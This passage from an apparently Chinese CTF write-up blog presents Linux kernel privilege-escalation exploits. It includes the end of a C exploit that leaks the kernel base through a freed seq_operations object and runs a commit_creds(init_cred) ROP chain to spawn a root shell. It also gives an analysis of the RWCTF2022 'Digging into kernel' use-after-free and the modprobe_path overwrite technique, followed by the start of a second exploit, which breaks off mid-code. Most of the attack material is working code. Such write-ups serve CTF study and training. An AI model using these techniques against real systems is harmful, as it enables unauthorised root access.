class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> seq_op = <span class="number">0xffffffff81319d30</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00f30</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff81089250</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82663300</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c8d40</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_xx = <span class="number">0xffffffff817800c6</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  idx;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">add_chunk</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ker_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,.size = size,.buf = buf&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x40</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,.size = size,.buf = buf&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x50</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x30</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">add_chunk</span> <span class="title">add</span> =</span> &#123;.size = size,.buf = buf,&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x20</span>, &amp;add);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> a;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ker_fd = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(ker_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open kerpwn&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open /proc/self/stat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line">    binary_dump(<span class="string">&quot;seq&quot;</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    kernel_offset = buf[<span class="number">0</span>] - seq_op;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">9</span>;</span><br><span class="line">    pop_rdi += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    add_rsp_xx += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_xx&quot;</span>, add_rsp_xx);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_xx;</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x8</span>,buf);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;begin to get shell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov r15,  0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,  pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,  init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,  commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,  swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,  0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,  0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,  0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,   0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,   0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,  rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,  0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,  8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,  rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,  seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RWCTF2022高校赛-Digging-into-kernel-1-2"><a href="#RWCTF2022高校赛-Digging-into-kernel-1-2" class="headerlink" title="[RWCTF2022高校赛] Digging into kernel 1 &amp; 2"></a>[RWCTF2022高校赛] Digging into kernel 1 &amp; 2</h2><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="xkmod-ioctl"><a href="#xkmod-ioctl" class="headerlink" title="xkmod_ioctl"></a>xkmod_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  copy_from_user(&amp;v4, a3, <span class="number">0x10</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x6666666</span> )                        <span class="comment">// edit</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf &amp;&amp; v6 &lt;= <span class="number">0x50</span> &amp;&amp; v5 &lt;= <span class="number">0x70</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v5, v4, (<span class="type">int</span>)v6);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x7777777</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x1111111</span> )                    <span class="comment">// add</span></span><br><span class="line">        buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">0xCC0</span>LL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf &amp;&amp; v6 &lt;= <span class="number">0x50</span> &amp;&amp; v5 &lt;= <span class="number">0x70</span> )      <span class="comment">// show</span></span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(v4, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v5);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))xkmod_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="xkmod-release"><a href="#xkmod-release" class="headerlink" title="xkmod_release"></a>xkmod_release</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">xkmod_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem_cache_free(s, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这题的漏洞是显而易见的，和<code>CISCN-2017 babydrive</code>一模一样，即<code>release</code>将<code>buf</code>释放后没有将<code>buf</code>指针置零，我们可以创建多个<code>fd</code>来利用该<code>UAF</code>漏洞。由于前面的题目都是用<code>kernel rop</code>来解决的，所以这一题我尝试使用<code>modprobe_path</code>来进行求解<br>首先我们要知道<code>modprobe_path</code>是什么东西。根据维基百科的说法，<code>modprobe</code>是最初由<code>Rusty Russell</code>编写的<code>Linux</code>程序，用于在<code>Linux</code>内核中添加可加载的内核模块。实际上，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。当我们执行具有未知文件类型的文件时，将执行存储在<code>modprobe_path</code>路径的程序。更准确地说，如果我们针对系统未知文件签名（魔术头）的文件调用<code>execve()</code>，则会产生以下调用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure><p>最终会调用<code>call_modprobe()</code>，该函数会有如下操作：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">      argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">      argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">      argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">      argv[<span class="number">3</span>] = module_name;</span><br><span class="line">      argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在系统上执行文件类型未知的文件时，系统将会执行当前路径存储在<code>modprobe_path</code>中的任何文件。因此，我们所研究的技术就是使用任意写入原语，将<code>modprobe_path</code>覆盖到我们自己编写的<code>Shell</code>脚本的路径中，然后执行具有未知文件签名的虚拟文件。其结果将导致在系统仍处于内核模式时执行<code>Shell</code>脚本，从而导致<code>root</code>特权的任意代码执行。<br>所以我们的思路即为利用<code>UAF</code>漏洞，将被释放的<code>buf</code>的<code>next</code>指针改为指向<code>modprobe_path</code>，再利用<code>UAF</code>将<code>modprobe_path</code>修改为我们恶意脚本的路径，进而使我们能够以<code>root</code>权限来执行我们的恶意脚本，赋予<code>flag</code>能给普通用户读取的权限<br>在内核“堆基址”<code>（page_offset_base） + 0x9d000</code> 处存放着 <code>secondary_startup_64</code> 函数的地址，而我们可以从 <code>free object</code> 的 <code>next</code> 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 堆基址 <code>+ 0x9d000</code> 处的 <code>object</code> 以泄露内核基址，这个地址前面刚好有一片为 <code>NULL</code> 的区域方便我们分配  </p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700  <span class="comment">// cat /proc/kallsyms | grep modprobe_path</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> 